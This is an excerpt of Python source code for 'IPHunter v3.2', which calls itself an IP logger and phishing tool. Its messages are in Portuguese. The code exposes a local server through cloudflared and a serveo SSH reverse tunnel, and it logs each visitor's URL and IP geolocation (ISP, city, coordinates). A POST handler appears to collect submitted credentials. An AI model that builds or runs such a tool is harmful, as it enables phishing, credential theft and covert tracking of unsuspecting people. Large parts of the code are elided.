...
# -*- coding: utf-8 -*-
# ============================================================
#  IPHunter v3.2 - IP Logger & Phishing Tool
...
def format_geo_info(geo):
    ...
    if not geo or geo.get('status') != 'success':
        err = geo.get('error_ipapi', '') or geo.get('error_ipapico', 'Unknown error')
        return f"    {C.RED}⚠ Nao foi possivel obter geolocalizacao: {err}{C.RESET}"
...
# ============================================================
#  CLOUDFLARED - CORRIGIDO E ROBUSTO
# ============================================================
def start_cloudflared(port):
    ...
    log_file = '/tmp/cloudflared_iphunter.log'
    ...
    try:
        ...
        print_error("Nao foi possivel ler o log.")
...
def start_serveo(port):
    ...
    time.sleep(1)
    os.system(f"ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:{port} serveo.net > /tmp/serveo.log 2>&1 &")
    time.sleep(6)
    for _ in range(15):
        try:
...
class IPLoggerHandler(http.server.BaseHTTPRequestHandler):
    ...
    def do_GET(self):
        ...
        if path == '/log':
            ...
            url = query.get('url', ['Unknown'])[0]
            host = query.get('host', ['Unknown'])[0]
            proto = query.get('proto', ['Unknown'])[0]
            ...
            # Dados de geolocalizacao do IP logger (se disponiveis)
            ip_isp = query.get('ip_isp', [''])[0]
            ip_city = query.get('ip_city', [''])[0]
            ip_region = query.get('ip_region', [''])[0]
            ip_country = query.get('ip_country', [''])[0]
            ip_country_code = query.get('ip_country_code', [''])[0]
            ip_zip = query.get('ip_zip', [''])[0]
            ip_lat = query.get('ip_lat', [''])[0]
            ip_lon = query.get('ip_lon', [''])[0]
            ip_timezone = query.get('ip_timezone', [''])[0]
            ...
            print(f"    {C.YELLOW}📍 URL:{C.RESET}          {C.BRIGHT_WHITE}{url}{C.RESET}")
            print()
    ...
    def do_POST(self):
        ...
        # GEOLOCALIZACAO PARA CREDENCIAIS
...
def show_banner():
    ...
    print(C.BRIGHT_CYAN + C.BOLD + "           IPHunter v3.2 - IP Logger & Phishing Tool" + C.RESET)
...
def main():
    ...
    while True:
        ...
        if choice == '99':
            ...
            clear()
            print()
            print_header("Obrigado por usar o IPHunter v3.2!")
            print()
            break
...
if __name__ == "__main__":
    try:
        ...
        clear()
        print()
        print_header("IPHunter v3.2 encerrado pelo usuario.")
        print()
    except Exception as e:
        clear()
        print()
